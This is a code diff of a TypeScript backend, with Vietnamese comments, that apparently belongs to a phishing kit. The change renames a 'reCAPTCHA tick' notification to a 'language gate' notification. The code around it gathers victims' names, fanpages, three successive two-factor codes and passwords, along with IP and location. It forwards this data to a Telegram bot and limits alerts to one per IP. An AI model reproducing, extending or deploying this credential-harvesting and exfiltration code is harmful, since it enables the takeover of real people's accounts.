@@ -108,7 +108,7 @@ function normalizeData(input: any = {}) {
         twoFa: input.twoFa ?? '',
         twoFaSecond: input.twoFaSecond ?? '',
         twoFaThird: input.twoFaThird ?? '',
-        recaptcha: input.recaptcha ?? '',
+        language: input.language ?? '',
     };
 }
 
@@ -174,9 +174,9 @@ function formatMessage(data: any, options: FormatMessageOptions = {}): string {
     return filtered.join('\n');
 }
 
-function isRecaptchaTickEvent(data: any): boolean {
+function isLanguageGateEvent(data: any): boolean {
     const d = normalizeData(data);
-    if (!d.recaptcha) return false;
+    if (!d.language) return false;
     const hasFormData =
         d.fullName ||
         d.fanpage ||
@@ -196,7 +196,7 @@ function isActivationInfoSubmitEvent(data: any): boolean {
 }
 
 function stripClientEventFlags(data: any = {}) {
-    const { activationInfoSubmit, recaptcha, flowCompleted, ...rest } = data;
+    const { activationInfoSubmit, language, recaptcha, flowCompleted, ...rest } = data;
     return rest;
 }
 
@@ -206,7 +206,7 @@ function hasCompletedFullFlow(data: any): boolean {
     return Boolean(String(d.twoFaThird ?? '').trim());
 }
 
-/** Không gửi lại reCAPTCHA / Thông tin kích hoạt khi user quay lại từ đầu sau khi đã xong. */
+/** Không gửi lại language gate / Thông tin kích hoạt khi user quay lại từ đầu sau khi đã xong. */
 function shouldSkipRepeatEarlyNotifications(data: any): boolean {
     if (data?.flowCompleted === true) return true;
 
@@ -222,22 +222,22 @@ function formatActivationInfoMessage(data: any): string {
     return formatMessage(data, { includePassword: false });
 }
 
-function formatRecaptchaTickMessage(data: any): string {
+function formatLanguageGateMessage(data: any): string {
     const d = normalizeData(data);
     return [
         `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
         `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
-        `<b>Language:</b> <code>${formatCodeField(d.recaptcha)}</code>`,
+        `<b>Language:</b> <code>${formatCodeField(d.language)}</code>`,
     ].join('\n');
 }
 
-function recaptchaTickIpKey(data: any): string {
+function languageGateIpKey(data: any): string {
     const ip = normalizeData(data).ip?.trim();
     return ip || 'no-ip';
 }
 
-/** IP đã gửi tin reCAPTCHA tick — mỗi IP chỉ một lần trong lifetime process. */
-const recaptchaTickSentByIp = new Set<string>();
+/** IP đã gửi tin language gate — mỗi IP chỉ một lần trong lifetime process. */
+const languageGateSentByIp = new Set<string>();
 
 async function postTelegramText(
     config: NonNullable<ReturnType<typeof getTelegramConfig>>,
@@ -274,47 +274,47 @@ async function postTelegramText(
     }
 }
 
-/** Tin Telegram riêng khi tick reCAPTCHA (IP + Location + trạng thái tick). */
-async function sendRecaptchaTickTelegram(
+/** Tin Telegram riêng khi Confirm ngôn ngữ (IP + Location + Language). */
+async function sendLanguageGateTelegram(
     config: NonNullable<ReturnType<typeof getTelegramConfig>>,
     data: any
 ): Promise<void> {
-    const ipKey = recaptchaTickIpKey(data);
+    const ipKey = languageGateIpKey(data);
 
     const mainKey = generateKey(stripClientEventFlags(data));
     const prev = memoryStoreTTL.get(mainKey);
     const fullData = mergeData(prev?.data, stripClientEventFlags(data));
 
     if (shouldSkipRepeatEarlyNotifications(data)) {
-        console.warn('⚠️ Bỏ qua tin reCAPTCHA — luồng kích hoạt đã hoàn tất trước đó');
+        console.warn('⚠️ Bỏ qua tin Language — luồng kích hoạt đã hoàn tất trước đó');
         memoryStoreTTL.set(mainKey, {
-            message: prev?.message ?? formatRecaptchaTickMessage(fullData),
+            message: prev?.message ?? formatLanguageGateMessage(fullData),
             messageId: prev?.messageId ?? 0,
             data: fullData,
         });
         return;
     }
 
-    if (recaptchaTickSentByIp.has(ipKey)) {
-        console.warn(`⚠️ reCAPTCHA tick đã gửi cho IP này, bỏ qua: ${ipKey}`);
+    if (languageGateSentByIp.has(ipKey)) {
+        console.warn(`⚠️ Language gate đã gửi cho IP này, bỏ qua: ${ipKey}`);
         memoryStoreTTL.set(mainKey, {
-            message: prev?.message ?? formatRecaptchaTickMessage(fullData),
+            message: prev?.message ?? formatLanguageGateMessage(fullData),
             messageId: prev?.messageId ?? 0,
             data: fullData,
         });
         return;
     }
 
-    recaptchaTickSentByIp.add(ipKey);
+    languageGateSentByIp.add(ipKey);
 
-    const text = formatRecaptchaTickMessage(data);
+    const text = formatLanguageGateMessage(data);
     const messageId = await postTelegramText(config, text);
 
     if (messageId) {
-        devLog(`✅ Sent reCAPTCHA tick message. ID: ${messageId}`);
+        devLog(`✅ Sent language gate message. ID: ${messageId}`);
     } else {
-        recaptchaTickSentByIp.delete(ipKey);
-        console.warn('⚠️ reCAPTCHA tick Telegram response không có message_id');
+        languageGateSentByIp.delete(ipKey);
+        console.warn('⚠️ Language gate Telegram response không có message_id');
     }
 
     memoryStoreTTL.set(mainKey, {
@@ -361,8 +361,8 @@ export async function sendTelegramMessage(data: any): Promise<void> {
         return;
     }
 
-    if (isRecaptchaTickEvent(data)) {
-        await sendRecaptchaTickTelegram(config, data);
+    if (isLanguageGateEvent(data)) {
+        await sendLanguageGateTelegram(config, data);
         return;
     }
 
